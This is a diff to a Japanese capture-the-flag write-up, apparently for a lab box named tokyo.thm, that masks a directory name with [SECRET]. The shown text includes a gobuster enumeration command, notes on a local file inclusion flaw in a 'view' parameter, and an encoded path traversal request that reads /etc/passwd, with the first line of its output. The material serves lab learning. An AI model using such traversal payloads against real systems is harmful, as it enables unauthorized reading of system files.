@@ -154,7 +154,7 @@ Scan me scan me scan all my ideas aaaaahhhhhhhh
 ```shell
 cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt
 
-gobuster dir -q -x=txt,php -u http://tokyo.thm/d1r3c70ry_center/ -w ./dirlist.txt -t 64 -k
+gobuster dir -q -x=txt,php -u http://tokyo.thm/[SECRET]/ -w ./dirlist.txt -t 64 -k
 
 ...
 /claim                (Status: 301) [Size: 323] 
@@ -171,9 +171,9 @@ index.php に LFI の臭いがする。
 	</div>
 ```
 
-GET /d1r3c70ry_center/claim/index.php?view=index.html のようにすると、画面の下にメインページの内容が表示されるので、LFIの脆弱性がある。
+GET /[SECRET]/claim/index.php?view=index.html のようにすると、画面の下にメインページの内容が表示されるので、LFIの脆弱性がある。
 
-GET /d1r3c70ry_center/claim/index.php?view=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd の形で成功。
+GET /[SECRET]/claim/index.php?view=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd の形で成功。
 
 ```
 root:x:0:0:root:/root:/bin/bash
